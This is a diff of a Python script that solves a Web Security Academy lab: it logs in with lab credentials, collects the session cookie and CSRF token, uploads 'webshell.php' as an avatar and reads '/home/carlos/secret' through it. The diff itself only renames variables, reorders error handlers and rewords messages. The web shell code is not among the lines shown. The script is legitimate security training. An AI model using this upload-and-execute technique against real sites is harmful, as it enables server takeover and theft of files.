@@ -11,9 +11,8 @@ def extract_csrf_token(response):
 
 def get_cookie(url):
     try:
-        first_response = requests.get(f"{url}/login")
-        first_cookie = first_response.cookies.values()[0]
-        csrf_token = extract_csrf_token(first_response)
+        response = requests.get(f"{url}/login")
+        csrf_token = extract_csrf_token(response)
 
         login_data = {
             "csrf": csrf_token,
@@ -21,17 +20,17 @@ def get_cookie(url):
             "password": "peter"
         }
 
-        second_response = requests.post(f"{url}/login", cookies={"session": first_cookie}, data=login_data, allow_redirects=False)
-        second_cookie = second_response.cookies.values()[0]
-        return second_cookie
+        login_response = requests.post(f"{url}/login", cookies={"session": response.cookies.values()[0]}, data=login_data, allow_redirects=False)
+        cookie = login_response.cookies.values()[0]
+        return cookie
 
-
-    except requests.exceptions.RequestException as e:
-        print(f"An error has occurred: {e}")
-        sys.exit(1)
 
     except IndexError:
         print("Cookie not found in the response, check your url and try again.")
+        sys.exit(1)
+
+    except requests.exceptions.RequestException as e:
+        print(f"An error has occurred: {e}")
         sys.exit(1)
 
 
@@ -59,7 +58,7 @@ def execute_command(url, cookie):
 def main():
     if len(sys.argv) != 2:
         print(f"Usage: python3 {sys.argv[0]} <url>")
-        print("Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
+        print(f"Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
         sys.exit(1)
 
     url = sys.argv[1].rstrip('/')
@@ -67,7 +66,7 @@ def main():
     cookie = get_cookie(url)
     print("Uploading webshell.php")
     upload_file(url, cookie)
-    print(f"File has been uploaded here: {url}/files/avatars/webshell.php")
+    print(f"Web shell has been uploaded here: {url}/files/avatars/webshell.php")
     print("The contents of the /home/carlos/secret file: ", end='')
     execute_command(url, cookie)
 
